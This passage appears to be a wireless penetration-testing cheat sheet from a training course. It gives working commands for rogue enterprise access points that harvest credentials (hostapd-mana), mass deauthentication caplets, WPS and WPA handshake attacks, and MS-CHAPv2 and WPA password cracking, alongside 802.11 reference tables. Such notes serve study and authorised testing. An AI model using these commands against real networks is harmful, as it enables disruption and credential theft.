# countryName             = US
# stateOrProvinceName     = CA
# localityName            = San Francisco
# organizationName        = Playtronics
# emailAddress            = ca@playtronics.com
# commonName              = "Playtronics Certificate Authority"

# Edit server config
sudo nano server.cnf
# [server]
# countryName             = US
# stateOrProvinceName     = CA
# localityName            = San Francisco
# organizationName        = Playtronics
# emailAddress            = admin@playtronics.com
# commonName              = "Playtronics"

# Regenerate DH (must be 2048-bit)
sudo rm dh
sudo make

# Clean up (if needed)
sudo make destroycerts
```

### hostapd-mana (Enterprise) — Full Config

```bash
# Install
sudo apt install hostapd-mana

# Create EAP user file
cat > /etc/hostapd-mana/mana.eap_user << 'EOF'
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
EOF

# Create hostapd-mana config
cat > /etc/hostapd-mana/mana.conf << 'EOF'
ssid=Playtronics
interface=wlan0
driver=nl80211
channel=1
hw_mode=g
ieee8021x=1
eap_server=1
eapol_key_index_workaround=0
eap_user_file=/etc/hostapd-mana/mana.eap_user
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh
auth_algs=1
wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP TKIP
mana_wpe=1
mana_credout=/tmp/hostapd.credout
mana_eapsuccess=1
mana_eaptls=1
EOF

# Start
sudo hostapd-mana /etc/hostapd-mana/mana.conf

# Background
sudo hostapd-mana -B /etc/hostapd-mana/mana.conf
```

### asleap

```bash
# Crack MS-CHAPv2 challenge/response
asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst

# With wordlist
asleap -C <challenge> -R <response> -W wordlist.txt

# Using hashcat format
hashcat -m 5500 'cosmo::::7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:ceb69885c656590c' /usr/share/john/password.lst

# Using John format
john --format=netntlm 'cosmo:$NETNTLM$ceb69885c656590c$7279f65aa49870f45822c89dcbdd73c1b89d377844caead4' --wordlist=password.lst
```

### crackapd

```bash
# Automatically runs asleap on hostapd-mana credentials
# Install (if available)
# Watches /tmp/hostapd.credout and adds cracked users to EAP user file
```

---

## 12. bettercap

### Installation & Startup

```bash
# Install
sudo apt install bettercap

# Start with specific interface
sudo bettercap -iface wlan0

# Start with caplet
sudo bettercap -iface wlan0 -caplet https-ui

# Start with eval commands
sudo bettercap -iface wlan0 -eval "set ticker.commands 'clear; wifi.show'; wifi.recon on; ticker on"
```

### Wi-Fi Recon

```
# Start recon (channel hopping)
wifi.recon on

# Stop recon
wifi.recon off

# Limit channels
wifi.recon.channel 1,6,11

# Target specific BSSID
wifi.recon 00:11:22:33:44:55

# Clear recon data
wifi.clear

# Show discovered APs/stations
wifi.show

# Sort by clients (descending)
set wifi.show.sort clients desc
wifi.show

# Filter by encryption (regex)
set wifi.show.filter WPA2

# Filter by BSSID prefix
set wifi.show.filter ^c0

# Clear filter
set wifi.show.filter ""

# Minimum RSSI
set wifi.rssi.min -49

# Limit displayed APs/clients
set wifi.show.limit 20

# Show manufacturer column
set wifi.show.manufacturer true

# Skip broken frames
set wifi.skip-broken true
```

### Wi-Fi Deauth

```
# Deauth all clients on AP
wifi.deauth 00:11:22:33:44:55

# Deauth specific client
wifi.deauth 00:AA:BB:CC:DD:EE

# Deauth everything (broadcast)
wifi.deauth ff:ff:ff:ff:ff:ff

# Skip list (do not deauth)
set wifi.deauth.skip 00:AA:BB:CC:DD:EE

# Skip if handshake already captured
set wifi.deauth.acquired false

# Deauth open networks
set wifi.deauth.open true

# Silent mode (hide deauth messages)
set wifi.deauth.silent false

# Handshake output file
set wifi.handshakes.file "~/handshakes/"
set wifi.handshakes.aggregate false
```

### bettercap Caplets

```bash
# Example: massdeauth.cap
cat > massdeauth.cap << 'EOF'
set $ {by}{fw}{env.iface.name}{reset} {bold}» {reset}
set ticker.period 10
set ticker.commands clear; wifi.deauth ff:ff:ff:ff:ff:ff
wifi.recon on
ticker on
events.clear
clear
EOF

# Example: deauth_corp.cap
cat > deauth_corp.cap << 'EOF'
set $ {br}{fw}{net.received.human} - {env.iface.name}{reset} » {reset}
set ticker.period 10
set ticker.commands clear; wifi.show; events.show; wifi.deauth 00:11:22:33:44:55
events.ignore wifi.ap.new
events.ignore wifi.client.probe
events.ignore wifi.client.new
wifi.recon on
ticker on
events.clear
clear
EOF

# Run caplet
include deauth_corp.cap

# Or from command line
sudo bettercap -iface wlan0 -caplet deauth_corp.cap
```

### bettercap Web Interface

```bash
# Configure web UI
sudo nano /usr/share/bettercap/caplets/https-ui.cap
# Change:
# set api.rest.username offsec
# set api.rest.password wifu

# Start with web UI
sudo bettercap -iface wlan0 -caplet https-ui

# Access at https://<ip>:443
# API at https://<ip>:8083

# Restrict access with nftables
sudo nft add table inet filter
sudo nft add chain inet filter INPUT { type filter hook input priority 0\; policy drop\; }
sudo nft add rule inet filter INPUT ip saddr 192.168.62.192 tcp dport 443 accept
sudo nft add rule inet filter INPUT ip saddr 192.168.62.192 tcp dport 8083 accept

# Accept certificate warnings in browser
```

### bettercap — Ticker

```
# Set ticker commands
set ticker.commands "clear; wifi.show"

# Set ticker period (seconds)
set ticker.period 5

# Start ticker
ticker on

# Stop ticker
ticker off
```

---

## 13. Kismet

### Installation & Configuration

```bash
# Install
sudo apt install kismet

# Configuration files
ls -la /etc/kismet/
# kismet.conf              - main config
# kismet_80211.conf        - Wi-Fi config
# kismet_alerts.conf       - WIDS alerts
# kismet_filter.conf       - filtering
# kismet_httpd.conf        - web server
# kismet_logging.conf      - logging
# kismet_memory.conf       - memory
# kismet_uav.conf          - drone detection

# Override file (create this)
sudo nano /etc/kismet/kismet_site.conf
# log_prefix=/var/log/kismet/
# log_types=kismet,pcapng
# httpd_bind_address=127.0.0.1

# Create log directory
sudo mkdir /var/log/kismet
```

### Running Kismet

```bash
# Start with interface (auto monitor mode)
sudo kismet -c wlan0

# No ncurses (full output)
sudo kismet -c wlan0 --no-ncurses

# Limit channels
sudo kismet -c wlan0:channels="1,6,11"

# Daemonize
sudo kismet --daemonize

# No logging (debug)
sudo kismet -c wlan0 --no-logging

# Set log types
sudo kismet -c wlan0 -T kismet,pcapng

# Set log prefix
sudo kismet -c wlan0 -p /var/log/kismet/

# Process pcap file (realtime)
sudo kismet -c capture.pcap:realtime=true

# Process pcap (packets per second)
sudo kismet -c capture.pcap:pps=1000

# Stop Kismet
# C+c or kill PID
ps aux | grep kismet
kill -9 <pid>
```

### Kismet Remote Capture

```bash
# Server (Kali host) — start Kismet without source
sudo kismet

# Client (remote) — SSH tunnel
ssh kali@192.168.62.192 -L 8000:localhost:3501

# Client — start capture
sudo kismet_cap_linux_wifi --connect 127.0.0.1:8000 --user offsec --password lab --source=wlan0:name=remote-wlan0
```

### Kismet Web Interface

```bash
# Default URL: http://localhost:2501
# First login: create user account

# Change bind address
sudo nano /etc/kismet/kismet_site.conf
# httpd_bind_address=127.0.0.1

# Enable HTTPS
# Configure in kismet_httpd.conf
```

### Kismet Log Export

```bash
# List data sources in kismet log
kismetdb_to_pcap --in Kismet-20200917-18-45-34-1.kismet --list-datasources

# Convert kismet to pcapng
kismetdb_to_pcap --in Kismet-20200917-18-45-34-1.kismet --out sample.pcapng --verbose

# Export devices to JSON
kismetdb_dump_devices --in /var/log/kismet/Kismet-20200917-17-45-17-1.kismet --out sample.json --skip-clean --verbose

# Query kismet database with sqlite3
sqlite3 /var/log/kismet/Kismet-20200917-18-45-34-1.kismet

# Tables:
# .tables
# KISMET, alerts, data, datasources, devices, messages, packets, snapshots

# Schema for devices table
.schema devices

# Query devices
select type, devmac from devices;

# One-liner query
sqlite3 /var/log/kismet/Kismet-20200917-18-45-34-1.kismet "select type, devmac from devices;"
```

---

## 14. Manual Network Connections

### wpa_supplicant (Open Network)

```bash
# Configuration
cat > wifi-client.conf << 'EOF'
network={
  ssid="hotel_wifi"
  scan_ssid=1
}
EOF

# Start
sudo wpa_supplicant -i wlan0 -c wifi-client.conf

# Background
sudo wpa_supplicant -i wlan0 -c wifi-client.conf -B
```

### wpa_supplicant (WPA-PSK)

```bash
# Configuration
cat > wifi-client.conf << 'EOF'
network={
  ssid="home_network"
  scan_ssid=1
  psk="correct battery horse staple"
  key_mgmt=WPA-PSK
}
EOF

# Force CCMP
# Add: pairwise=CCMP
# Force TKIP
# Add: pairwise=TKIP

# Start
sudo wpa_supplicant -i wlan0 -c wifi-client.conf

# Background
sudo wpa_supplicant -i wlan0 -c wifi-client.conf -B
```

### wpa_passphrase

```bash
# Generate PSK (prompts for passphrase)
wpa_passphrase MyNetwork

# Generate PSK (passphrase as argument)
wpa_passphrase MyNetwork "password123"

# Output to file
wpa_passphrase MyNetwork "password123" > home_network.conf
```

### dhclient

```bash
# Get DHCP lease
sudo dhclient wlan0

# Release lease
sudo dhclient -r wlan0
```

### dnsmasq (DHCP Server)

```bash
# Install
sudo apt install dnsmasq

# Configuration
cat > dnsmasq.conf << 'EOF'
domain-needed
bogus-priv
no-resolv
filterwin2k
expand-hosts
domain=localdomain
local=/localdomain/
listen-address=10.0.0.1
dhcp-range=10.0.0.100,10.0.0.199,12h
dhcp-lease-max=100
dhcp-option=option:router,10.0.0.1
dhcp-authoritative
server=8.8.8.8
server=8.8.4.4
EOF

# Start
sudo dnsmasq --conf-file=dnsmasq.conf

# Check syslog
sudo tail /var/log/syslog | grep dnsmasq
```

### IP Forwarding & NAT

```bash
# Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Install nftables
sudo apt install nftables

# Add NAT table
sudo nft add table nat

# Add postrouting chain
sudo nft 'add chain nat postrouting { type nat hook postrouting priority 100 ; }'

# Add masquerade rule
sudo nft add rule ip nat postrouting oifname "eth0" ip daddr != 10.0.0.1/24 masquerade

# Flush rules (cleanup)
sudo nft flush ruleset
```

### hostapd (Access Point)

```bash
# Install
sudo apt install hostapd

# Configuration (WPA2 PSK)
cat > hostapd.conf << 'EOF'
interface=wlan0
ssid=BTTF
channel=11
hw_mode=g
ieee80211n=1
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=GreatScott
EOF

# Start
sudo hostapd hostapd.conf

# Background
sudo hostapd -B hostapd.conf
```

### Static IP on AP Interface

```bash
sudo ip link set wlan0 up
sudo ip addr add 10.0.0.1/24 dev wlan0
```

---

## 15. Wordlist Generation & Mangling

### John the Ripper

```bash
# Basic wordlist mode
john --wordlist=password.lst --rules --stdout

# Pipe to aircrack-ng
john --wordlist=/usr/share/john/password.lst --rules --stdout | aircrack-ng -e "TargetNet" -w - capture.cap

# Edit rules
sudo nano /etc/john/john.conf
# Add under [List.Rules:Wordlist]:
# $[0-9]$[0-9]
# $[0-9]$[0-9]$[0-9]

# Test rules
john --wordlist=password.lst --rules --stdout | grep -i Password123

# Specific rules
john --wordlist=password.lst --rules=Wordlist --stdout
```

### Crunch

```bash
# Basic wordlist (8-9 chars, all printable)
crunch 8 9

# With charset
crunch 8 9 abc123

# Pattern (password + 3 digits)
crunch 11 11 -t password%%%

# Pattern with charset
crunch 11 11 0123456789 -t password@@@

# Permutations (no repeats)
crunch 1 1 -p abcde12345

# Multiple words (permutations)
crunch 1 1 -p dog cat bird

# Pattern + permutations
crunch 5 5 -t ddd%% -p dog cat bird

# Pattern + charset + permutations
crunch 5 5 aADE -t ddd@@ -p dog cat bird

# Pipe to aircrack-ng
crunch 11 11 -t password%%% | aircrack-ng -e "TargetNet" -w - capture.cap
```

### RSMangler

```bash
# Create wordlist
echo bird > wordlist.txt
echo cat >> wordlist.txt
echo dog >> wordlist.txt

# Basic mangling
rsmangler --file wordlist.txt

# Output to file
rsmangler --file wordlist.txt --output mangled.txt

# Disable duplicate check (faster)
rsmangler --file wordlist.txt --allow-duplicates

# Limit word length
rsmangler --file wordlist.txt --min 12 --max 13

# Pipe from stdin
cat wordlist.txt | rsmangler --file -

# Pipe to aircrack-ng
rsmangler --file wordlist.txt --min 12 --max 13 | aircrack-ng -e "TargetNet" -w - capture.cap
```

---

## 16. Hashcat

### Device Info & Benchmarking

```bash
# List devices
hashcat -I

# Benchmark all modes (slow)
hashcat -b

# Benchmark specific mode
hashcat -b -m 2500    # WPA-EAPOL-PBKDF2 (deprecated)
hashcat -b -m 22000   # WPA-PBKDF2-PMKID+EAPOL

# Specify device
hashcat -d 1 -m 22000 hash.hc22000 wordlist.txt

# Specify device type (1=CPU, 2=GPU, 3=FPGA)
hashcat -D 2 -m 22000 hash.hc22000 wordlist.txt
```

### WPA Cracking

```bash
# Convert PCAP to hccapx (2500 mode)
/usr/lib/hashcat-utils/cap2hccapx.bin capture.cap output.hccapx

# Crack with 2500 mode (deprecated)
hashcat -m 2500 --deprecated-check-disable output.hccapx wordlist.txt

# Convert to 22000 mode
hcxpcapngtool -o hash.hc22000 capture.cap

# Crack with 22000 mode
hashcat -a 0 -m 22000 hash.hc22000 wordlist.txt

# With rules
hashcat -a 0 -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule

# Mask attack
hashcat -a 3 -m 22000 hash.hc22000 ?d?d?d?d?d?d?d?d

# Session management
hashcat --session mysession -m 22000 hash.hc22000 wordlist.txt
hashcat --session mysession --restore

# Potfile
cat ~/.hashcat/hashcat.potfile
rm ~/.hashcat/hashcat.potfile
```

### MS-CHAPv2 (Enterprise)

```bash
# Crack MS-CHAPv2
hashcat -m 5500 'cosmo::::7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:ceb69885c656590c' wordlist.txt
```

### Hashcat Utilities

```bash
# Install
sudo apt install hashcat-utils

# cap2hccapx — convert PCAP to hccapx
/usr/lib/hashcat-utils/cap2hccapx.bin capture.cap output.hccapx
# Args: input.cap output.hccapx [ESSID:BSSID]

# Other utilities in /usr/lib/hashcat-utils/
ls /usr/lib/hashcat-utils/
```

---

## 17. Frame Types & 802.11 Protocol Reference

### Frame Control Field

```
Protocol Version (2 bits)  — 0 (current)
Type (2 bits)              — 0=Management, 1=Control, 2=Data, 3=Extension
Subtype (4 bits)           — See tables below
To DS (1 bit)
From DS (1 bit)
More Frag (1 bit)
Retry (1 bit)
Power Mgmt (1 bit)         — 0=active, 1=power-save
More Data (1 bit)
Protected Frame (1 bit)    — 0=unencrypted, 1=encrypted
+HTC/Order (1 bit)
```

### Management Frame Subtypes

| Subtype | Frame |
|---------|-------|
| 0 | Association Request |
| 1 | Association Response |
| 2 | Reassociation Request |
| 3 | Reassociation Response |
| 4 | Probe Request |
| 5 | Probe Response |
| 6 | Measurement Pilot |
| 8 | Beacon |
| 9 | ATIM |
| 10 | Disassociation |
| 11 | Authentication |
| 12 | Deauthentication |
| 13 | Action |
| 14 | Action No ACK |

### Control Frame Subtypes

| Subtype | Frame |
|---------|-------|
| 7 | Control Wrapper |
| 8 | Block ACK Request |
| 9 | Block ACK |
| 10 | PS-Poll |
| 11 | RTS |
| 12 | CTS |
| 13 | ACK |
| 14 | CF End |
| 15 | CF End + CF-ACK |

### Data Frame Subtypes

| Subtype | Frame |
|---------|-------|
| 0 | Data |
| 1 | Data + CF ACK |
| 2 | Data + CF Poll |
| 3 | Data + CF ACK + CF Poll |
| 4 | Null Function (No Data) |
| 8 | QoS Data |
| 12 | QoS Null (No Data) |

### Address Fields (ToDS/FromDS)

| FromDS | ToDS | Address 1 | Address 2 | Address 3 | Address 4 |
|--------|------|-----------|-----------|-----------|-----------|
| 0 | 0 | Destination | Source | BSSID | N/A |
| 0 | 1 | BSSID | Source | Destination | N/A |
| 1 | 0 | Destination | BSSID | Source | N/A |
| 1 | 1 | Receiver | Transmitter | Destination | Source |

### EAPoL Key Frame Structure

```
Protocol Version (1 byte)     — 1, 2, or 3 (802.1X-2001/2004/2010)
Packet Type (1 byte)          — 3 = key
Packet Body Length (2 bytes)
Descriptor Type (1 byte)      — 2=EAPoL RSN Key (WPA2), 254=EAPoL WPA Key (WPA1)
Key Information (2 bytes)     — flags (see below)
Key Length (2 bytes)          — 5/13=WEP40/104, 16/32=TKIP/CCMP
Replay Counter (8 bytes)      — incrementing
Key Nonce (32 bytes)          — ANonce or SNonce
EAPoL Key IV (16 bytes)       — 0 if unused
Key Receive Sequence Counter (8 bytes)
Key Identifier (8 bytes)      — reserved, set to 0
Key MIC (variable)            — MIC of packet
Key Data Length (2 bytes)
Key Data (variable)           — RSNE or KDE
```

### Key Information Flags

```
Key Descriptor Version (bits 0-2)  — 1=ARC4+HMAC-MD5, 2=AES+HMAC-SHA1-128, 3=AES+AES-128-CMAC
Key Type (bit 3)                   — 1=PTK, 0=GTK/SMK
Install (bit 6)                    — install keys
Key ACK (bit 7)                    — expects EAPoL-Key response
Key MIC (bit 8)                    — MIC present
Secure (bit 9)                     — key exchange complete
Error (bit 10)                     — MIC failure
Request (bit 11)                   — request handshake
Encrypted Key Data (bit 12)        — Key Data encrypted
SMK Message (bit 13)               — SMK handshake
```

### WPA 4-Way Handshake

```
Message 1: AP -> Client
  ANonce, Key Information (ACK, MIC), Replay Counter

Message 2: Client -> AP
  SNonce, MIC, RSN IE, Replay Counter

Message 3: AP -> Client
  ANonce, MIC, GTK (encrypted), RSN IE, Replay Counter

Message 4: Client -> AP
  MIC, Replay Counter, ACK
```

### WPA3 SAE (Dragonfly) Handshake

```
Commit Exchange:
  Client -> AP: Commit (scalar, element)
  AP -> Client: Commit (scalar, element)

Confirm Exchange:
  Client -> AP: Confirm (A-Confirm)
  AP -> Client: Confirm (B-Confirm)

Then 4-way handshake (like WPA2)
```

### WEP Authentication

```
Open Authentication:
  Client -> AP: Auth Request (algorithm=0, seq=1)
  AP -> Client: Auth Response (success)

Shared Authentication:
  Client -> AP: Auth Request (algorithm=1, seq=1)
  AP -> Client: Challenge Text (seq=2)
  Client -> AP: Encrypted Challenge (seq=3)
  AP -> Client: Auth Response (success/fail)
```

### WPS Registration Protocol

```
M1 = Version || N1 || Description || PKE
M2 = Version || N1 || N2 || Description || PKR || ConfigData || HMACAuthKey(M1 || M2*)
M3 = Version || N2 || E-Hash1 || E-Hash2 || HMACAuthKey(M2 || M3*)
M4 = Version || N1 || R-Hash1 || R-Hash2 || ENCKeyWrapKey(R-S1) || HMACAuthKey(M3 || M4*)
M5 = Version || N2 || ENCKeyWrapKey(E-S1) || HMACAuthKey(M4 || M5*)
M6 = Version || N1 || ENCKeyWrapKey(R-S2) || HMACAuthKey(M5 || M6*)
M7 = Version || N2 || ENCKeyWrapKey(E-S2 || ConfigData) || HMACAuthKey(M6 || M7*)
M8 = Version || N1 || ENCKeyWrapKey(ConfigData) || HMACAuthKey(M7 || M8*)
```

### PMF / 802.11w Connection Matrix

| AP | Client | Connection | PMF |
|----|--------|-----------|-----|
| No | No | Yes | No |
| No | Capable | Yes | No |
| No | Required | No | — |
| Capable | No | Yes | No |
| Capable | Capable | Yes | Yes |
| Capable | Required | Yes | Yes |
| Required | No | No | — |
| Required | Capable | Yes | Yes |
| Required | Required | Yes | Yes |

### 802.11 Standards Reference

| Standard | Band | Max Rate | Features |
|----------|------|----------|----------|
| 802.11 | 2.4 GHz | 2 Mbps | DSSS/FHSS |
| 802.11a | 5 GHz | 54 Mbps | OFDM |
| 802.11b | 2.4 GHz | 11 Mbps | CCK |
| 802.11g | 2.4 GHz | 54 Mbps | OFDM, backwards compatible with b |
| 802.11h | 5 GHz | — | DFS/TPC |
| 802.11i | — | — | WPA2/CCMP |
| 802.11n (Wi-Fi 4) | 2.4/5 GHz | 600 Mbps | MIMO, HT40 |
| 802.11ac (Wi-Fi 5) | 5 GHz | 6.9 Gbps | VHT, MU-MIMO, 80/160 MHz |
| 802.11ad (WiGig) | 60 GHz | 6.7 Gbps | Multi-gigabit |
| 802.11ax (Wi-Fi 6) | 2.4/5/6 GHz | 9.6 Gbps | OFDMA, 1024-QAM |
| 802.11be (Wi-Fi 7) | 2.4/5/6 GHz | 46 Gbps | EHT, 320 MHz |
| 802.11w | — | — | PMF (Protected Management Frames) |

### Encryption Reference

| Protocol | Cipher | Key Size | IV Size | Integrity |
|----------|--------|----------|---------|-----------|
| WEP | RC4 | 40/104 bits | 24 bits | CRC-32 |
| WPA (TKIP) | RC4 | 128 bits | 48 bits | Michael |
| WPA2 (CCMP) | AES | 128 bits | 48 bits | CBC-MAC |
| WPA3 (CCMP) | AES | 128 bits | 48 bits | CBC-MAC |
| WPA3 (GCMP-256) | AES | 256 bits | 48 bits | GMAC |
| OWE | AES | 128/256 bits | — | — |

---

## 18. Wireless Network Architectures

### Infrastructure

```
BSS (Basic Service Set):
  - 1 AP + 1+ STAs
  - AP connected to DS (Distribution System / wired network)

ESS (Extended Service Set):
  - 2+ APs connected to same DS
  - Same SSID (ESSID)
  - Multiple BSSIDs

Linux terminology:
  - Managed mode = station
  - Master mode = AP
```

### WDS (Wireless Distribution System)

```
- DS over Wi-Fi instead of cable
- Two modes:
  - Wireless Bridging: only WDS APs communicate
  - Wireless Repeating: STAs and APs communicate
- Typically same channel as AP for backhaul
- Can halve data rates on high-traffic networks
```

### Ad-Hoc (IBSS)

```
- Independent Basic Service Set
- 2+ STAs, no AP
- One STA takes AP responsibilities (beaconing, auth)
- Does not relay packets like AP
- Ad-Hoc Demo (Pseudo-IBSS):
  - No management frames
  - No beaconing, no association
  - BSSID = all zeros
  - Manual rate setting
```

### Mesh (802.11s)

```
- All APs equal, no defined roles
- Extends network where cabling is difficult
- Device classes:
  - MP (Mesh Point): link between mesh devices
  - MAP (Mesh AP): MP + AP functionality
  - MPP (Mesh Portal): link to wired network
- Peering modes:
  - MPM (Mesh Peering Management): unsecure
  - AMPE (Authenticated Mesh Peering Exchange): secure
    - Uses SAE or 802.1X
- Routing: HWMP (default), AODV, BATMAN, OLSR
- Max 32 nodes (802.11s)
- Proprietary mesh: not interoperable
```

### Wi-Fi Direct (Wi-Fi P2P)

```
- Direct device-to-device connection
- Not an 802.11 standard — Wi-Fi Alliance specification
- Software AP + WPS-style connection
- WPA2 encryption
- Service discovery
- One-to-one or groups
- Use cases: printing, file sharing, Miracast, gaming, tethering
```

### Monitor Mode

```
- Captures all 802.11 frames in range
- No association required
- Essential for:
  - Packet capture (raw 802.11)
  - Packet injection
  - Deauthentication attacks
  - Handshake capture
- Enabled via airmon-ng, iw, or iwconfig
- Interface typically renamed to wlanXmon
```

---

## Quick Reference — Most Used Commands

```bash
# Monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Scan
sudo airodump-ng wlan0mon

# Capture handshake
sudo airodump-ng -c 6 -w capture --bssid 00:11:22:33:44:55 wlan0mon
sudo aireplay-ng -0 1 -a 00:11:22:33:44:55 -c 00:AA:BB:CC:DD:EE wlan0mon

# Crack WPA
aircrack-ng -w wordlist.txt -e "TargetNet" -b 00:11:22:33:44:55 capture-01.cap

# WPS attack
sudo wash -i wlan0mon
sudo reaver -b 00:11:22:33:44:55 -i wlan0mon -v -K

# Rogue AP
sudo hostapd-mana rogue.conf
sudo aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan1mon

# Enterprise attack
sudo hostapd-mana /etc/hostapd-mana/mana.conf
asleap -C <challenge> -R <response> -W wordlist.txt

# bettercap
sudo bettercap -iface wlan0
wifi.recon on
wifi.deauth 00:11:22:33:44:55

# Kismet
sudo kismet -c wlan0

# Hashcat
hashcat -m 22000 hash.hc22000 wordlist.txt
hashcat -m 5500 'user::::response:challenge' wordlist.txt
```
